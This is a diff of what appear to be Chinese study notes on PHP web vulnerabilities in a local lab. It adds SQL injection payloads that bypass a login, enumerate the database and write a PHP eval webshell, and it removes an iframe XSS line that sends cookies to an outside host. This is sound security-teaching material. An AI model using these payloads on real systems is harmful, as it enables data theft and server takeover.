@@ -42,6 +42,30 @@ if ($type=='login'){
 
 SELECT * FROM users WHERE username='1234' or 1=1#' AND password='12'
 
+payload
+
+username=
+
+```sql
+//万能密码
+admin' or 1=1#
+//爆库
+0' union select 1,group_concat(schema_name),3 from information_schema.schemata#
+//爆表
+0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
+//爆字段
+0' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() AND table_name='users'#
+//写webshell
+0' union select 1,2,0x3c3f706870206576616c28245f504f53545b2761275d293f3e into outfile 'D:\\phpstudy_pro\\WWW\\php_trick\\shell.php'#
+```
+
+password=
+
+```plain
+12
+1234
+```
+
 ### 危害
 
 轻则脱库
@@ -117,7 +141,7 @@ echo $msg;
 
 
 ```http
-msg=<iframe src="https://yanmy.top/index.php?cookies=document.cookie"></iframe>
+msg=<iframe src="https://www.baidu.com"></iframe>
 msg=<script>alert(1);</script>
 msg=<script>alert(document.cookie);</script>
 ```
